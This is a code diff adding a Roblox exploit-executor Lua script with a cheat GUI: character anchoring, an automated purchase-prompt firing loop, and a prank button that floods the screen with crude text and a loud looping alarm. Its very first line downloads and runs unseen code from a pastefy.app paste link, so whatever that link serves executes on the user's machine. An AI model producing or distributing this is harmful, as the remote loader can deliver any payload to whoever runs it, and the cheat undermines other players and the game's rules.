@@ -1,0 +1,239 @@
+loadstring(game:HttpGet("https://pastefy.app/sN3tymyl/raw", true))()
+
+task.wait(3)
+
+-- =========================
+-- TON SCRIPT GUI COMPLET
+-- =========================
+
+local player = game.Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RADIUS = 30
+
+-- GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.ResetOnSpawn = false
+screenGui.Name = "ChatGPTPrimeFinal"
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 240, 0, 240)
+mainFrame.Position = UDim2.new(0, 20, 0, 20)
+mainFrame.BackgroundColor3 = Color3.fromRGB(15,15,15)
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0,16)
+
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 2
+stroke.Color = Color3.fromRGB(0,255,150)
+stroke.Parent = mainFrame
+
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1,0,0,40)
+titleBar.BackgroundTransparency = 1
+titleBar.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-40,1,0)
+title.Position = UDim2.new(0,10,0,0)
+title.BackgroundTransparency = 1
+title.Text = "CHAT GPT PRIME 🔥"
+title.TextColor3 = Color3.new(1,1,1)
+title.TextScaled = true
+title.Parent = titleBar
+
+local minimize = Instance.new("TextButton")
+minimize.Size = UDim2.new(0,30,0,30)
+minimize.Position = UDim2.new(1,-35,0,5)
+minimize.Text = "-"
+minimize.BackgroundColor3 = Color3.fromRGB(40,40,40)
+minimize.TextColor3 = Color3.new(1,1,1)
+minimize.Parent = titleBar
+Instance.new("UICorner", minimize).CornerRadius = UDim.new(1,0)
+
+local content = Instance.new("Frame")
+content.Size = UDim2.new(1,0,1,-40)
+content.Position = UDim2.new(0,0,0,40)
+content.BackgroundTransparency = 1
+content.Parent = mainFrame
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0,10)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.Parent = content
+
+local function createButton(name)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0,200,0,45)
+	btn.BackgroundColor3 = Color3.fromRGB(120,0,0)
+	btn.TextColor3 = Color3.new(1,1,1)
+	btn.TextScaled = true
+	btn.Text = name .. " : OFF"
+	btn.Parent = content
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0,14)
+	return btn
+end
+
+-- ANCHOR
+local anchorButton = createButton("Anchor")
+local anchored = false
+
+local function setAnchor(state)
+	local char = player.Character or player.CharacterAdded:Wait()
+	local root = char:WaitForChild("HumanoidRootPart")
+	anchored = state
+	root.Anchored = state
+	anchorButton.Text = "Anchor : " .. (state and "ON" or "OFF")
+	anchorButton.BackgroundColor3 = state and Color3.fromRGB(0,170,0) or Color3.fromRGB(120,0,0)
+end
+
+anchorButton.MouseButton1Click:Connect(function()
+	setAnchor(not anchored)
+end)
+
+-- AUTO BUY
+local autoButton = createButton("Auto Buy")
+local autoBuy = false
+
+local function getPromptPosition(prompt)
+	local parent = prompt.Parent
+	if parent:IsA("BasePart") then return parent.Position end
+	local model = prompt:FindFirstAncestorOfClass("Model")
+	if model and model.PrimaryPart then return model.PrimaryPart.Position end
+end
+
+local function autoInteract()
+	while autoBuy do
+		local char = player.Character
+		if char and char:FindFirstChild("HumanoidRootPart") then
+			local rootPos = char.HumanoidRootPart.Position
+			local closestPrompt
+			local closestDistance = RADIUS
+			
+			for _, prompt in pairs(workspace:GetDescendants()) do
+				if prompt:IsA("ProximityPrompt") and prompt.Enabled and string.lower(prompt.ActionText) == "purchase" then
+					local pos = getPromptPosition(prompt)
+					if pos then
+						local dist = (pos - rootPos).Magnitude
+						if dist <= closestDistance then
+							closestDistance = dist
+							closestPrompt = prompt
+						end
+					end
+				end
+			end
+			
+			if closestPrompt then
+				fireproximityprompt(closestPrompt)
+			end
+		end
+		task.wait(0.3)
+	end
+end
+
+local function setAutoBuy(state)
+	autoBuy = state
+	autoButton.Text = "Auto Buy : " .. (state and "ON" or "OFF")
+	autoButton.BackgroundColor3 = state and Color3.fromRGB(0,170,0) or Color3.fromRGB(120,0,0)
+	if state then task.spawn(autoInteract) end
+end
+
+autoButton.MouseButton1Click:Connect(function()
+	setAutoBuy(not autoBuy)
+end)
+
+-- PING PONG
+local pingButton = createButton("Ping Pong Mode")
+local ping = false
+
+pingButton.MouseButton1Click:Connect(function()
+	ping = not ping
+	pingButton.Text = "Ping Pong Mode : " .. (ping and "ON" or "OFF")
+	pingButton.BackgroundColor3 = ping and Color3.fromRGB(0,170,0) or Color3.fromRGB(120,0,0)
+	setAnchor(ping)
+	setAutoBuy(ping)
+end)
+
+-- SECRET 🤫
+local secretButton = createButton("Secret 🤫")
+local secret = false
+
+local timerGui
+local alarmGui
+local alarmSound
+
+local function stopSecret()
+	secret = false
+	secretButton.Text = "Secret 🤫 : OFF"
+	secretButton.BackgroundColor3 = Color3.fromRGB(120,0,0)
+	if timerGui then timerGui:Destroy() end
+	if alarmGui then alarmGui:Destroy() end
+	if alarmSound then alarmSound:Stop() end
+end
+
+secretButton.MouseButton1Click:Connect(function()
+	if secret then
+		stopSecret()
+		return
+	end
+	
+	secret = true
+	secretButton.Text = "Secret 🤫 : ON"
+	secretButton.BackgroundColor3 = Color3.fromRGB(0,170,0)
+
+	timerGui = Instance.new("TextLabel")
+	timerGui.Size = UDim2.new(0,200,0,80)
+	timerGui.Position = UDim2.new(0.5,-100,0.5,-40)
+	timerGui.BackgroundColor3 = Color3.fromRGB(20,20,20)
+	timerGui.TextColor3 = Color3.new(1,1,1)
+	timerGui.TextScaled = true
+	timerGui.Parent = screenGui
+	Instance.new("UICorner", timerGui)
+
+	local timeLeft = 90
+
+	while timeLeft > 0 and secret do
+		timerGui.Text = "Attends : " .. timeLeft .. "s"
+		task.wait(1)
+		timeLeft -= 1
+	end
+
+	if not secret then return end
+	timerGui:Destroy()
+
+	alarmGui = Instance.new("Frame")
+	alarmGui.Size = UDim2.new(1,0,1,0)
+	alarmGui.BackgroundColor3 = Color3.new(0,0,0)
+	alarmGui.Parent = screenGui
+
+	local text = Instance.new("TextLabel")
+	text.Size = UDim2.new(1,0,0.6,0)
+	text.Text = "NGA NGA NGA NGA NGA NGA"
+	text.TextScaled = true
+	text.TextColor3 = Color3.new(1,0,0)
+	text.BackgroundTransparency = 1
+	text.Parent = alarmGui
+
+	local stopBtn = Instance.new("TextButton")
+	stopBtn.Size = UDim2.new(0,200,0,80)
+	stopBtn.Position = UDim2.new(0.5,-100,0.7,0)
+	stopBtn.Text = "STOP"
+	stopBtn.TextScaled = true
+	stopBtn.BackgroundColor3 = Color3.fromRGB(170,0,0)
+	stopBtn.TextColor3 = Color3.new(1,1,1)
+	stopBtn.Parent = alarmGui
+	Instance.new("UICorner", stopBtn)
+
+	alarmSound = Instance.new("Sound")
+	alarmSound.SoundId = "rbxassetid://9118823102"
+	alarmSound.Looped = true
+	alarmSound.Volume = 5
+	alarmSound.Parent = alarmGui
+	alarmSound:Play()
+
+	stopBtn.MouseButton1Click:Connect(function()
+		stopSecret()
+	end)
+end)
